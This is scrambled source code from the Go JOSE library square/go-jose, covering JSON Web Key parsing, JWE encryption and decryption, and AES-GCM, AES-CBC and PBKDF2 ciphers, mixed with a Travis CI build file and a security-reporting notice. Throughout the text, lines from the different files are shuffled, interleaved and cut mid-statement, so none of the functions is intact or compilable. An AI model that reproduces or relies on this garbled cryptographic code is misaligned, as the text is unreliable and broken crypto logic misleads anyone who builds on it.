// Public creates JSONWebKey with corresponding publik key if JWK represents asymmetric private key.
var key interface{}
"JSONWebKey) Thumbprint(hash crypto.Hash) ([]byte, error) {"
var raw rawJSONWebKey
"rsa.PublicKey, ed25519.PublicKey:"
"k = JSONWebKey{Key: key, KeyID: raw.Kid, Algorithm: raw.Alg, Use: raw.Use}"
yBytes := pub.Y.Bytes()
"missing = append(missing, ""Q"")"
if err != nil {
"json:""d,omitempty"""
y := key.Y.bigInt()
"return nil, errors.New(""square/go-jose: invalid EC key, X/Y are not on declared curve"")"
return json.Marshal(raw)
"""fmt"""
case ed25519.PrivateKey:
"rsa.PrivateKey, error) {"
"""crypto/ecdsa"""
"return nil, fmt.Errorf(""square/go-jose: invalid OCT (symmetric) key, missing k value"")"
"big.Int, e int) (string, error) {"
"privateKey := make([]byte, ed25519.PrivateKeySize)"
 key.D == nil {
"""reflect"""
JSONWebKey) Public() JSONWebKey {
"key, err = raw.ecPrivateKey()"
"copy(privateKey[0:32], key.D.bytes())"
switch k.Key.(type) {
"Kty: ""oct"","
"key, err = raw.ecPublicKey()"
case key.D == nil:
"}, nil"
raw = fromRsaPublicKey(key)
"k.Certificates, err = parseCertificateChain(raw.X5c)"
func fromEcPublicKey(pub 
"key, err = raw.rsaPublicKey()"
" Unless required by applicable law or agreed to in writing, software"
 key.X == nil 
return 
if key.N == nil 
"return nil, fmt.Errorf(""square/go-jose: invalid Ed25519 private key, missing %s value(s)"", strings.Join(missing, "", ""))"
JSONWebKey) Valid() bool {
"case ""OKP"":"
 You may obtain a copy of the License at
 pub.X == nil 
ecdsa.PrivateKey:
X5c []string 
"big.Int) (string, error) {"
"key.Q.bigInt(),"
h.Write([]byte(input))
"return rv, err"
// Certificates
raw = fromEdPublicKey(key)
"json:""y,omitempty"""
"return nil, fmt.Errorf(""square/go-jose: invalid EC private key, wrong length for y"")"
"newBuffer(n.Bytes()).base64()), nil"
if key.Dp != nil {
"// dSize returns the size in octets for the ""d"" member of an elliptic curve"
if curveSize(curve) != len(key.Y.data) {
"json:""x5c,omitempty"""
"raw, err = fromSymmetricKey(key)"
"json:""kty,omitempty"""
func fromRsaPrivateKey(rsa 
JSONWebKeySet) Key(kid string) []JSONWebKey {
if key.X == nil 
"return fmt.Errorf(""failed to unmarshal x5c field: %s"", err)"
"newFixedSizeBuffer(x.Bytes(), coordLength).base64(),"
ecdsa.PrivateKey) (
 key.Y == nil 
"Crv: name,"
"err = fmt.Errorf(""square/go-jose: unknown json web key type '%s'"", raw.Kty)"
"return nil, fmt.Errorf(""square/go-jose: invalid RSA private key, missing %s value(s)"", strings.Join(missing, "", ""))"
"Kty: ""OKP"","
Use          string
var err error
ec.PublicKey)
"D: key.D.bigInt(),"
const edThumbprintTemplate = 
"for _, key := range s.Keys {"
"return nil, fmt.Errorf(""square/go-jose: invalid EC key (X/Y too large)"")"
rv.Precomputed.Dq = key.Dq.bigInt()
rsa.PrivateKey{
"case ""oct"":"
"if raw.Crv == ""Ed25519"" "
"key, err = raw.symmetricKey()"
"json:""crv,omitempty"""
rv := ed25519.PrivateKey(privateKey)
Key          interface{}
"// the curve specified in the ""crv"" parameter."
"""encoding/base64"""
if key.Dq != nil {
"return nil, fmt.Errorf(""square/go-jose: invalid EC private key, wrong length for d"")"
"func ecThumbprintInput(curve elliptic.Curve, x, y "
raw)
"case ""EC"":"
return JSONWebKey{} // returning invalid key
"missing = append(missing, ""D"")"
"rawJSONWebKey, error) {"
rawJSONWebKey {
"return nil, fmt.Errorf(""square/go-jose: invalid EC private key, wrong length for x"")"
"json:""dp,omitempty"""
if k.IsPublic() {
return err
"raw.X5c = append(raw.X5c, base64.StdEncoding.EncodeToString(cert.Raw))"
case ed25519.PublicKey:
"return rv, nil"
x := key.X.bigInt()
case 
"key, err = raw.edPrivateKey()"
"keys = append(keys, key)"
"return nil, fmt.Errorf(""square/go-jose: unsupported elliptic curve '%s'"", key.Crv)"
"E: key.E.toInt(),"
var input string
curve = elliptic.P521()
"""math/big"""
if k.Key == nil {
if key.KeyID == kid {
Algorithm    string
func (k 
"{""crv"":""%s"",""kty"":""EC"",""x"":""%s"",""y"":""%s""}"
"return nil, ErrUnsupportedKeyType"
if key.Qi != nil {
"case ""RSA"":"
"rsa.PublicKey, error) {"
"// completely optional. Therefore for RSA/ECDSA, D != nil is a contract that"
// The length of this octet string MUST be ceiling(log-base-2(n)/8)
"func (k JSONWebKey) MarshalJSON() ([]byte, error) {"
func fromSymmetricKey(key []byte) (
"return raw, nil"
byteBuffer 
Alg string      
Keys []JSONWebKey 
"if !curve.IsOnCurve(x, y) {"
"raw, err = fromRsaPrivateKey(key)"
"return nil, fmt.Errorf(""square/go-jose: invalid RSA key, missing n/e values"")"
switch {
func (key rawJSONWebKey) rsaPrivateKey() (
 limitations under the License.
Y   
rsa.PublicKey:
// cases where they are not distinct. Hence method returns a slice
"// rawJSONWebKey represents a public or private key in JWK format, used for parsing/serializing."
rv := 
"Kty: ""RSA"","
package jose
"missing = append(missing, ""P"")"
return ret
"newBufferFromInt(uint64(e)).base64(),"
"missing = append(missing, ""N"")"
switch raw.Kty {
raw.Qi = newBuffer(rsa.Precomputed.Qinv.Bytes())
"copy(publicKey[0:32], key.X.bytes())"
" Licensed under the Apache License, Version 2.0 (the ""License"")"
if len(x.Bytes()) > coordLength 
"// IsPublic returns true if the JWK represents a public key (not symmetric, not private)."
"""crypto"""
ecdsa.PublicKey) (
N   
raw := fromEdPublicKey(ed25519.PublicKey(ed[32:]))
"json:""use,omitempty"""
big.Int{
"key, err = raw.edPublicKey()"
func (s 
"return fmt.Sprintf(edThumbprintTemplate, crv,"
"N: key.N.bigInt(),"
if len(rsa.Primes) != 2 {
rv := ed25519.PublicKey(publicKey)
"key, err = raw.rsaPrivateKey()"
Kid string      
case key.X == nil:
"json:""dq,omitempty"""
 len(y.Bytes()) > coordLength {
Use string      
func fromRsaPublicKey(pub 
"case ""P-384"":"
PublicKey: ecdsa.PublicKey{
func rsaThumbprintInput(n 
 len(yBytes) > size {
 key.Y == nil {
"json:""alg,omitempty"""
// octets (where n is the order of the curve).
size := curveSize(pub.Curve)
// MarshalJSON serializes the given key to its JSON representation.
// -- Following fields are only used for private keys --
raw.P = newBuffer(rsa.Primes[0].Bytes())
var raw 
"missing = append(missing, ""X"")"
"crv := ""Ed25519"""
if ec.D == nil {
"input, err = rsaThumbprintInput(key.N, key.E)"
raw.Dp = newBuffer(rsa.Precomputed.Dp.Bytes())
 key.D == nil 
"raw.D = newFixedSizeBuffer(ec.D.Bytes(), dSize(ec.PublicKey.Curve))"
if key.K == nil {
"""gopkg.in/square/go-jose.v2/json"""
case []byte:
"raw, err = fromEcPrivateKey(key)"
bitLen := order.BitLen()
 raw.X != nil {
" WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
"ecdsa.PublicKey, error) {"
"return nil, fmt.Errorf(""square/go-jose: invalid EC private key"")"
if len(ed) > 32 {
if len(missing) > 0 {
X   
"{""crv"":""%s"",""kty"":""OKP"",x"":""%s""}"
"case ""P-521"":"
rsa.PrivateKey:
"K:   newBuffer(key),"
"return key.K.bytes(), nil"
if pub == nil 
import (
"json:""p,omitempty"""
var missing []string
"err = fmt.Errorf(""square/go-jose: unknown curve %s'"", raw.Crv)"
"ecdsa.PrivateKey, error) {"
func fromEdPrivateKey(ed ed25519.PrivateKey) (
 you may not use this file except in compliance with the License.
section-6.2.1.2
" distributed under the License is distributed on an ""AS IS"" BASIS,"
"return fmt.Sprintf(ecThumbprintTemplate, crv,"
"func edThumbprintInput(ed ed25519.PublicKey) (string, error) {"
E   
// JSONWebKeySet represents a JWK Set object.
Primes: []
raw := fromRsaPublicKey(
"case ""P-256"":"
JSONWebKey) IsPublic() bool {
case key.N == nil:
"return """", errors.New(""square/go-jose: invalid elliptic key (too large)"")"
"X:   newFixedSizeBuffer(xBytes, size),"
raw.Kid = k.KeyID
KeyID        string
type JSONWebKey struct {
"// RSA uses D, P and Q, while ECDSA uses only D. Fields Dp, Dq, and Qi are"
"X:     x,"
"key.P.bigInt(),"
"func (key rawJSONWebKey) edPublicKey() (ed25519.PublicKey, error) {"
"// that a JWK Set ""SHOULD"" use distinct key IDs, but allows for some"
JSONWebKey) UnmarshalJSON(data []byte) (err error) {
"input, err = ecThumbprintInput(key.Curve, key.X, key.Y)"
case key.Q == nil:
rsa.PublicKey) 
"input, err = edThumbprintInput(ed25519.PublicKey(key[32:]))"
"input, err = edThumbprintInput(key)"
return
if key.Curve == nil 
Crv string      
ret.Key = key.Public()
// The length of this octet string MUST be the full size of a coordinate for
if key.X == nil {
"publicKey := make([]byte, ed25519.PublicKeySize)"
- go get github.com/mattn/goveralls
.cov 
script:
language: go
sudo: false
matrix:
- export PATH=$HOME/.local/bin:$PATH
- '1.8.x'
- go test ./json -v 
- openssl aes-256-cbc -K $encrypted_1528c3c2cafd_key -iv $encrypted_1528c3c2cafd_iv -in .gitcookies.sh.enc -out .gitcookies.sh -d 
" that is causing Travis-CI builds to fail. For more info, see"
- '1.9.x'
before_install:
- bash .gitcookies.sh 
 true
- go test ./cipher -v -covermode=count -coverprofile=cipher/profile.cov
 Install encrypted gitcookies to get around bandwidth-limits
- '1.10.x'
.cov > merged.coverprofile
 go build 
 no coverage for forked encoding/json package
- gocovmerge 
- cd ..
- go test . -v -covermode=count -coverprofile=profile.cov
after_success:
 PATH=$PWD:$PATH cram -v jose-util.t
- go get code.google.com/p/go.tools/cmd/cover 
- go get github.com/stretchr/testify/assert
before_script:
- go get golang.org/x/tools/cmd/cover 
- cd jose-util 
  allow_failures:
- pip install cram --user
- go get github.com/wadey/gocovmerge
- $HOME/gopath/bin/goveralls -coverprofile merged.coverprofile -service=travis-ci
- go test ./jwt -v -covermode=count -coverprofile=jwt/profile.cov
go_import_path: gopkg.in/square/go-jose.v2
  fast_finish: true
- '1.11.x'
- '1.7.x'
 https://github.com/golang/go/issues/12933
    - go: tip
"return index, sanitized, plaintext, err"
case JSONWebKey:
rawKey = encryptionKey
"JSONWebEncryption, error)"
"err := obj.protected.set(headerEncryption, ctx.contentAlg)"
rawHeader{}
default:
// ECDH-ES (w/o key wrapping) is similar to DIRECT mode
KeyID      string
if comp := obj.protected.getCompression()
"return eo.WithHeader(HeaderType, typ)"
// EncrypterOptions.
"ecdsa.PublicKey),"
if plaintext == nil 
"plaintext, err = decompress(comp, plaintext)"
"if rcpt.KeyID != """" {"
if rcpts == nil 
"""errors"""
"err = obj.protected.set(headerCompression, ctx.compressionAlg)"
"// for which the decryption was successful, the merged headers for that recipient,"
"return nil, fmt.Errorf(""square/go-jose: recipients is nil or empty"")"
encrypter.keyGenerator = randomKeyGenerator{
"func makeJWERecipient(alg KeyAlgorithm, encryptionKey interface{}) (recipientKeyInfo, error) {"
"return obj, nil"
// Found a valid CEK -- let's try to decrypt.
"plaintext, err = compress(ctx.compressionAlg, plaintext)"
"key: []byte(decryptionKey),"
symmetricKeyCipher{
"b, err := json.Marshal(v)"
sr.p2c = recipient.PBES2Count
"decryptKey(headers rawHeader, recipient "
"return -1, Header{}, nil, err"
encryption := globalHeaders.getEncryption()
 len(rcpts) == 0 {
obj.recipients[0].header = nil
"recipientInfo, err = makeJWERecipient(recipient.Algorithm, recipient.Key)"
break
"recipientInfo, generator keyGenerator) ([]byte, error) // Decrypt a key"
aeadParts{
"genKey() ([]byte, rawHeader, error)"
ecdsa.PublicKey:
EncrypterOptions) WithContentType(contentType ContentType) 
contentAlg     ContentEncryption
// and the plaintext.
// with support for multiple recipients. It returns the index of the recipient
var recipientInfo recipientKeyInfo
"// WithHeader adds an arbitrary value to the ExtraHeaders map, initializing it"
type keyEncrypter interface {
recipientHeaders := obj.mergedHeaders(
"EncryptWithAuthData(plaintext []byte, aad []byte) ("
func (eo 
"return plaintext, err"
"""crypto/rsa"""
Algorithm  KeyAlgorithm
"return nil, err"
Encrypt(plaintext []byte) (
cipher := getContentCipher(enc)
// additional values here. All values must be JSON-serializable.
"for _, recipient := range rcpts {"
encrypter.keyGenerator = ecKeyGenerator{
     http://www.apache.org/licenses/LICENSE-2.0
"obj.recipients = make([]recipientInfo, len(ctx.recipients))"
"cek, err := decrypter.decryptKey(recipientHeaders, "
var headers rawHeader
"err = recipient.header.set(headerAlgorithm, info.keyAlg)"
"return nil, fmt.Errorf(""square/go-jose: unsupported enc value '%s'"", string(headers.getEncryption()))"
if err == nil {
"critical, err := headers.getCritical()"
type contentCipher interface {
"cipher:     cipher,"
ExtraHeaders map[HeaderKey]interface{}
"decrypt(cek []byte, aad []byte, parts "
headers := obj.mergedHeaders(nil)
globalHeaders := obj.mergedHeaders(nil)
index = i
headers = recipientHeaders
if len(ctx.recipients) == 1 {
Key        interface{}
"sanitized, err := headers.sanitized()"
encrypter := 
if ctx.compressionAlg != NONE {
symmetricKeyCipher)
PBES2Salt  []byte
"encryptKey(cek []byte, alg KeyAlgorithm) (recipientInfo, error) // Encrypt a key"
"return recipient, err"
ecdsa.PublicKey{}) {
type keyGenerator interface {
encrypter.recipients = []recipientKeyInfo{recipientInfo}
recipientInfo.keyID = recipient.KeyID
"cipher:     getContentCipher(enc),"
"keyID, rawKey = encryptionKey.KeyID, encryptionKey.Key"
JSONWebKey:
 Copyright 2014 Square Inc.
generator := randomKeyGenerator{
"return nil, fmt.Errorf(""square/go-jose: invalid crit header"")"
"return -1, Header{}, nil, fmt.Errorf(""square/go-jose: unsupported crit header"")"
"size: cipher.keySize(),"
"return nil, errors.New(""square/go-jose: too many recipients in payload"
 See the License for the specific language governing permissions and
EncrypterOptions) WithType(typ ContentType) 
"genericEncrypter) EncryptWithAuthData(plaintext, aad []byte) ("
// Implementation of encrypt method producing a JWE object.
cipher := getContentCipher(encryption)
"recipient, err := makeJWERecipient(alg, encryptionKey.Key)"
authData := obj.computeAuthData()
if err != nil {
recipientInfo.keyID = rcpt.KeyID
"encrypt(cek []byte, aad, plaintext []byte) ("
"""fmt"""
var plaintext []byte
keyAlg       KeyAlgorithm
"return nil, fmt.Errorf(""square/go-jose: unsupported crit header"")"
"""crypto/ecdsa"""
"""reflect"""
type Encrypter interface {
// A generic key decrypter
obj.iv = parts.iv
"key: decryptionKey,"
"}, nil"
var rawKey interface{}
" Unless required by applicable law or agreed to in writing, software"
if reflect.TypeOf(rawKey) != reflect.TypeOf([]byte{}) {
// Move per-recipient headers into main protected header if there's
var keyID string
"ExtraHeaders: ctx.extraHeaders,"
return eo
obj := 
"recipient, generator)"
return 
// EncrypterOptions represents options that can be set on new encrypters.
"parts, err := ctx.cipher.encrypt(cek, authData, plaintext)"
// if necessary. It returns itself and so can be used in a fluent style.
type genericEncrypter struct {
"privateKey: decryptionKey,"
 You may obtain a copy of the License at
if eo.ExtraHeaders == nil {
ecdsa.PrivateKey:
"return nil, fmt.Errorf(""square/go-jose: no recipients to encrypt to"")"
// only a single recipient.
// A generic content cipher
// PBES2-HS384
" comp != """" {"
recipient)
"return -1, Header{}, nil, fmt.Errorf(""square/go-jose: failed to sanitize header: %v"", err)"
"return newECDHRecipient(alg, encryptionKey)"
// Encrypter represents an encrypter which produces an encrypted JWE object.
// A key generator (for generating/getting a CEK)
encrypter.compressionAlg = opts.Compression
typeOf := reflect.TypeOf(rawKey)
keyGenerator: randomKeyGenerator{
A256KW. If they are not provided a safe
keyGenerator   keyGenerator
"decrypter, err := newDecrypter(decryptionKey)"
type Recipient struct {
"// The ""zip"" header parameter may only be present in the protected header."
obj.tag = parts.tag
"if sr, ok := recipientInfo.keyEncrypter.("
// A generic key encrypter
"func NewEncrypter(enc ContentEncryption, rcpt Recipient, opts "
"return ctx.EncryptWithAuthData(plaintext, nil)"
"ctx.recipients = append(ctx.recipients, recipientInfo)"
"return newSymmetricRecipient(alg, encryptionKey)"
func (ctx 
if opts != nil {
"recipientInfo, _ := newSymmetricRecipient(rcpt.Algorithm, rawKey.([]byte))"
sr.p2s = recipient.PBES2Salt
// NewEncrypter creates an appropriate encrypter based on the key type
"critical, err := globalHeaders.getCritical()"
"func (obj JSONWebEncryption) Decrypt(decryptionKey interface{}) ([]byte, error) {"
// Can just add a standard recipient
obj.recipients[i] = recipient
// Optional map of additional keys to be inserted into the protected header
"return -1, Header{}, nil, fmt.Errorf(""square/go-jose: invalid crit header"")"
if plaintext == nil {
cipher := getContentCipher(headers.getEncryption())
compressionAlg CompressionAlgorithm
 err != nil {
return err
// Direct encryption mode must be treated differently
publicKey: rawKey.(
switch recipient.Algorithm {
case 
"algID:     string(enc),"
eo.ExtraHeaders[k] = v
switch encryptionKey := rcpt.Key.(type) {
EncrypterOptions {
"tag:        obj.tag,"
recipientInfo.keyID = keyID
"JSONWebEncryption, error) {"
"return nil, ErrUnsupportedKeyType"
err := encrypter.addRecipient(recipient)
case DIRECT:
type keyDecrypter interface {
// default of 100000 will be used for the count and a 128-bit random salt will
ecDecrypterSigner{
case string:
 limitations under the License.
rsa.PublicKey:
"for i, recipient := range obj.recipients {"
"return encrypter, err"
type EncrypterOptions struct {
package jose
genericEncrypter) Options() EncrypterOptions {
// Decrypt and validate the object and return the plaintext. Note that this
"return recipientKeyInfo{}, ErrUnsupportedKeyType"
"recipientInfo, _ := newECDHRecipient(rcpt.Algorithm, rawKey.("
" Licensed under the Apache License, Version 2.0 (the ""License"")"
"case DIRECT, ECDH_ES:"
Compression CompressionAlgorithm
obj.protected.merge(obj.recipients[0].header)
"aeadParts, error)"
"// WithContentType adds a content type (""cty"") header and returns the updated"
ecdsa.PublicKey))
encrypter.keyGenerator = staticKeyGenerator{
parts := 
return newDecrypter(decryptionKey.Key)
genericEncrypter) addRecipient(recipient Recipient) (err error) {
switch encryptionKey := encryptionKey.(type) {
// decryption use DecryptMulti instead.
"for k, v := range ctx.extraHeaders {"
// Recipient represents an algorithm/key to encrypt messages to.
JSONWebEncryption{}
recipient.keyID = encryptionKey.KeyID
switch rcpt.Algorithm {
"return nil, ErrCryptoFailure"
rsaDecrypterSigner{
"aeadParts) ([]byte, error)"
// be generated.
if cipher == nil {
"func newDecrypter(decryptionKey interface{}) (keyDecrypter, error) {"
// A generic encrypter based on the given key encrypter and content cipher.
"return -1, Header{}, nil, ErrCryptoFailure"
err := encrypter.addRecipient(rcpt)
"recipient, err := info.keyEncrypter.encryptKey(cek, info.keyAlg)"
return EncrypterOptions{
"cek, headers, err := ctx.keyGenerator.genKey()"
case ECDH_ES:
if len(obj.recipients) > 1 {
"ciphertext: obj.ciphertext,"
headers)
"EncrypterOptions) (Encrypter, error) {"
"return newRSARecipient(alg, encryptionKey)"
"""gopkg.in/square/go-jose.v2/json"""
"func NewMultiEncrypter(enc ContentEncryption, rcpts []Recipient, opts "
"// DecryptMulti decrypts and validates the object and returns the plaintexts,"
case []byte:
recipient := obj.recipients[0]
cipher         contentCipher
obj.aad = aad
genericEncrypter{
"if recipient.KeyID != """" {"
" WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
PBES2Count int
encrypter.extraHeaders = opts.ExtraHeaders
"case PBES2_HS256_A128KW, PBES2_HS384_A192KW, PBES2_HS512_A256KW:"
type recipientKeyInfo struct {
keyID        string
if encrypter.cipher.keySize() != len(rawKey.([]byte)) {
"// function does not support multi-recipient, if you desire multi-recipient"
if len(ctx.recipients) == 0 {
obj.protected)[k] = makeRawMessage(b)
rsa.PrivateKey:
"key: rawKey.([]byte),"
keyEncrypter keyEncrypter
// on the password-based encryption algorithms PBES2-HS256
"return nil, ErrInvalidKeySize"
Options() EncrypterOptions
 ok {
obj.ciphertext = parts.ciphertext
"return newSymmetricRecipient(alg, []byte(encryptionKey))"
if len(critical) > 0 {
obj.protected = 
import (
"EncrypterOptions) WithHeader(k HeaderKey, v interface{}) "
"size: encrypter.cipher.keySize(),"
 you may not use this file except in compliance with the License.
extraHeaders   map[HeaderKey]interface{}
"return fmt.Errorf(""square/go-jose: key algorithm '%s' not supported in multi-recipient mode"", recipient.Algorithm)"
" distributed under the License is distributed on an ""AS IS"" BASIS,"
keySize() int
"// PBES2Count and PBES2Salt correspond with the  ""p2c"" and ""p2s"" headers used"
"contentAlg: enc,"
"plaintext, err = cipher.decrypt(cek, authData, parts)"
"return encrypter, nil"
// of a JWS object. Some specifications which make use of JWS like to insert
// NewMultiEncrypter creates a multi-encrypter based on the given parameters
if typeOf != reflect.TypeOf(
genericEncrypter) Encrypt(plaintext []byte) (
// newDecrypter creates an appropriate decrypter based on the key type
"err = recipient.header.set(headerKeyID, info.keyID)"
"return eo.WithHeader(HeaderContentType, contentType)"
"for i, info := range ctx.recipients {"
switch decryptionKey := decryptionKey.(type) {
"A128KW,"
obj.protected.merge(
"size:      encrypter.cipher.keySize(),"
index := -1
"if info.keyID != """" {"
"iv:         obj.iv,"
"return nil, ErrUnsupportedAlgorithm"
"// WithType adds a type (""typ"") header and returns the updated EncrypterOptions."
eo.ExtraHeaders = map[HeaderKey]interface{}{}
"recipients: []recipientKeyInfo{},"
recipients     []recipientKeyInfo
"return -1, Header{}, nil, fmt.Errorf(""square/go-jose: unsupported enc value '%s'"", string(encryption))"
"A192KW, and PBES2-HS512"
"func (obj JSONWebEncryption) DecryptMulti(decryptionKey interface{}) (int, Header, []byte, error) {"
if encrypter.cipher == nil {
" expecting only one"")"
"Compression:  ctx.compressionAlg,"
======================
guidelines at <https://bugcrowd.com/squareopensource>.
can make. We therefore encourage reporting security issues with the code
Square recognizes the important contributions the security research community
"If you believe you have discovered a security vulnerability, please follow the"
contained in this repository.
Serious about security
return recipientInfo{
"authtagBytes: keySize,"
// Static key generator
return recipientSigInfo{
func (ctx randomKeyGenerator) keySize() int {
"encryptedKey: parts.ciphertext,"
"salt, err := getRandomSalt(defaultP2SSize)"
protected: 
"cek, err := aead.decrypt(ctx.key, []byte{}, parts)"
// Create a new content cipher based on AES-GCM
"return nil, ErrCryptoFailure"
"""hash"""
// Sign the given payload
case HS384:
"func (ctx aeadContentCipher) encrypt(key, aad, pt []byte) ("
"return nil, fmt.Errorf(""square/go-jose: invalid P2S: must be present"")"
 Salt Input
"rawHeader{},"
"return errors.New(""square/go-jose: invalid hmac"")"
// Compute the HMAC based on the given alg value
hash = sha512.New
"return nil, fmt.Errorf(""square/go-jose: invalid P2C: must be a positive integer"")"
signer: 
"iv, ciphertext, tag []byte"
keyEncrypter: 
return recipientKeyInfo{
// Input/output from an AEAD operation
rawHeader{}
default:
func (ctx aeadContentCipher) keySize() int {
"key := pbkdf2.Key(ctx.key, salt, ctx.p2c, keyLen, h)"
var hash func() hash.Hash
"ciphertext: ciphertextAndTag[:offset],"
"return 24, sha512.New384"
"panic(""invalid algorithm"")"
return nil
authtagBytes int
aeadContentCipher{
"_, err := io.ReadFull(RandReader, salt)"
"authtagBytes: 16,"
"""bytes"""
symmetricMac{
"keyLen, h := getPbkdf2Params(alg)"
switch keyAlg {
// Default salt size: 128 bits
"func newSymmetricRecipient(keyAlg KeyAlgorithm, key []byte) (recipientKeyInfo, error) {"
"keyBytes:     keySize,"
"return salt, nil"
header: 
"keyAlg: keyAlg,"
"func newSymmetricSigner(sigAlg SignatureAlgorithm, key []byte) (recipientSigInfo, error) {"
"return 32, sha512.New"
// Get key size for this cipher
"header.set(headerIV, newBuffer(parts.iv))"
func (ctx 
"copy(cek, ctx.key)"
"_, err = io.ReadFull(RandReader, iv)"
case A192CBC_HS384:
"key := pbkdf2.Key(ctx.key, salt, p2c, keyLen, h)"
// Get an AEAD cipher object for the given content encryption algorithm
if p2c <= 0 {
"""errors"""
type symmetricKeyCipher struct {
// pbkdf2.Key.
"func (ctx symmetricMac) signPayload(payload []byte, alg SignatureAlgorithm) (Signature, error) {"
hash = sha512.New384
case PBES2_HS512_A256KW:
"symmetricKeyCipher) encryptKey(cek []byte, alg KeyAlgorithm) (recipientInfo, error) {"
"return errors.New(""square/go-jose: failed to compute hmac"")"
var RandReader = rand.Reader
"Signature: mac,"
func newAESCBC(keySize int) contentCipher {
"header.set(headerTag, newBuffer(parts.tag))"
type symmetricMac struct {
"""gopkg.in/square/go-jose.v2/cipher"""
// getPbkdf2Params returns the key length and hash function used in
 len(p2s.data) == 0 {
case A128GCM:
"return key, rawHeader{}, nil"
"return recipientInfo{}, err"
"""crypto/aes"""
"case HS256, HS384, HS512:"
"func (ctx symmetricMac) hmac(payload []byte, alg SignatureAlgorithm) ([]byte, error) {"
return newAESGCM(16)
"func (ctx randomKeyGenerator) genKey() ([]byte, rawHeader, error) {"
"recipientInfo, generator keyGenerator) ([]byte, error) {"
"""crypto/subtle"""
"symmetricKeyCipher) decryptKey(headers rawHeader, recipient "
symmetricKeyCipher{
type staticKeyGenerator struct {
"p2s, err := headers.getP2S()"
"return josecipher.NewCBCHMAC(key, aes.NewCipher)"
section-4.8.1.2
"salt := bytes.Join([][]byte{[]byte(alg), ctx.p2s}, []byte{0x00})"
aead := newAESGCM(len(ctx.key))
// use AES cipher with derived key
type randomKeyGenerator struct {
 Copyright 2014 Square Inc.
" WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
"// According to documentation, Write() on hash never fails"
return newAESCBC(32)
func newAESGCM(keySize int) contentCipher {
"aes, err := aes.NewCipher(key)"
"encryptedKey: jek,"
// newSymmetricSigner creates a recipientSigInfo based on the given key.
hash = sha256.New
 See the License for the specific language governing permissions and
"""golang.org/x/crypto/pbkdf2"""
"case PBES2_HS256_A128KW, PBES2_HS384_A192KW, PBES2_HS512_A256KW:"
"aead, err := ctx.getAead(key)"
"mac, err := ctx.hmac(payload, alg)"
// https://tools.ietf.org/html/rfc7518
if len(mac) != len(expected) {
// Verify the given payload
"// NIST recommends a minimum of 10,000:"
"tag:        ciphertextAndTag[offset:],"
"""crypto/sha512"""
// Verify that key management algorithm is supported by this encrypter
"""crypto/sha256"""
"return hmac.Sum(nil), nil"
 len(parts.tag) < ctx.authtagBytes {
// Decrypt the content encryption key.
header := 
"""crypto/hmac"""
case A128CBC_HS256:
ctx.p2c = defaultP2C
"parts, err := aead.encrypt(ctx.key, []byte{}, cek)"
type aeadContentCipher struct {
func getContentCipher(alg ContentEncryption) contentCipher {
case HS512:
"func getPbkdf2Params(alg KeyAlgorithm) (int, func() hash.Hash) {"
// Signer/verifier for MAC modes
if err != nil {
"key := make([]byte, ctx.size)"
aeadParts{
"block, err := aes.NewCipher(ctx.key)"
"return cek, rawHeader{}, nil"
if len(ctx.p2s) == 0 {
// Create a new content cipher based on AES-CBC
// Encrypt some data
// Generate a static key (for direct mode)
return ctx.keyBytes
"case A128KW, A192KW, A256KW:"
"""fmt"""
"return recipientKeyInfo{}, ErrUnsupportedAlgorithm"
import (
"getAead      func(key []byte) (cipher.AEAD, error)"
// getRandomSalt generates a new salt of the given size.
defaultP2SSize = 16
return ctx.size
"header:       header,"
// salt is UTF8(Alg) 
"iv, err := headers.getIV()"
"tag, err := headers.getTag()"
// Decrypt some data
"_, _ = hmac.Write(payload)"
case PBES2_HS256_A128KW:
return newAESGCM(24)
"func getRandomSalt(size int) ([]byte, error) {"
func (ctx staticKeyGenerator) keySize() int {
"tag:        tag.bytes(),"
"hmac := hmac.New(hash, ctx.key)"
 you may not use this file except in compliance with the License.
" distributed under the License is distributed on an ""AS IS"" BASIS,"
HMAC
// Encrypt the content encryption key.
ctx.p2s = salt
if ctx.p2c <= 0 {
"block, err := aes.NewCipher(key)"
"salt := make([]byte, size)"
"return nil, fmt.Errorf(""square/go-jose: invalid IV: %v"", err)"
"header.set(headerP2S, newBuffer(ctx.p2s))"
"aeadParts) ([]byte, error) {"
"return nil, fmt.Errorf(""square/go-jose: invalid tag: %v"", err)"
"""crypto/cipher"""
// newSymmetricRecipient creates a JWE encrypter based on AES-GCM key wrap.
offset := len(ciphertextAndTag) - ctx.authtagBytes
case DIRECT:
// Dummy key cipher for shared symmetric key mode
"getAead: func(key []byte) (cipher.AEAD, error) {"
// Random reader (stubbed out in tests)
defaultP2C = 100000
switch alg {
"// 1Password uses 100,000:"
"sigAlg: sigAlg,"
return newAESGCM(32)
"iv:         iv,"
case A192GCM:
"return cek, nil"
"p2c, err := headers.getP2C()"
"expected, err := ctx.hmac(payload, alg)"
p2c int    // PBES2 Count
"}, nil"
// https://pages.nist.gov/800-63-3/sp800-63b.html
// A content cipher based on an AEAD construction
case HS256:
header:       
case A256GCM:
"aeadParts, error) {"
"iv := make([]byte, aead.NonceSize())"
// Random key generator
return cipher.NewGCM(aes)
case A256CBC_HS512:
" Unless required by applicable law or agreed to in writing, software"
return newAESCBC(16)
"ciphertextAndTag := aead.Seal(nil, iv, pt, aad)"
return Signature{
"return nil, fmt.Errorf(""square/go-jose: invalid P2C: %v"", err)"
switch headers.getAlgorithm() {
return 
 0x00 
type aeadParts struct {
"func (ctx aeadContentCipher) decrypt(key, aad []byte, parts "
return newAESCBC(24)
 limitations under the License.
"return nil, err"
"case A128GCMKW, A192GCMKW, A256GCMKW:"
key []byte // Pre-shared content-encryption key
package jose
alg := headers.getAlgorithm()
"return Signature{}, errors.New(""square/go-jose: failed to compute hmac"")"
"ciphertext: recipient.encryptedKey,"
"""crypto/rand"""
 You may obtain a copy of the License at
p2s []byte // PBES2 Salt Input
"header.set(headerP2C, ctx.p2c)"
"iv:         iv.bytes(),"
"// RFC7518 recommends a minimum of 1,000 iterations:"
// https://support.1password.com/pbkdf2/
"return nil, ErrUnsupportedAlgorithm"
size int
// Initialize a new nonce
// Key size for static generator
" Licensed under the Apache License, Version 2.0 (the ""License"")"
"cek, err := josecipher.KeyUnwrap(block, recipient.encryptedKey)"
// derive key
"return aead.Open(nil, parts.iv, append(parts.ciphertext, parts.tag...), aad)"
if p2s == nil 
key []byte
"return recipientInfo{}, ErrUnsupportedAlgorithm"
"match := subtle.ConstantTimeCompare(mac, expected)"
"""io"""
